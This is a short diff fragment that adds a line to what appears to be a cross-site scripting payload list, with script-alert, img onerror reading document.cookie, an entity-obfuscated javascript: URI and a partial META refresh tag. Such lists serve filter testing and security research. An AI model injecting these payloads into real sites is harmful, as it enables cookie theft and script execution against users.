@@ -1,3 +1,4 @@
+<script> alert(1) </script>
 <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
 <IMG SRC=j&#X41vascript:alert('test2')>
 <META HTTP-EQUIV="refresh"
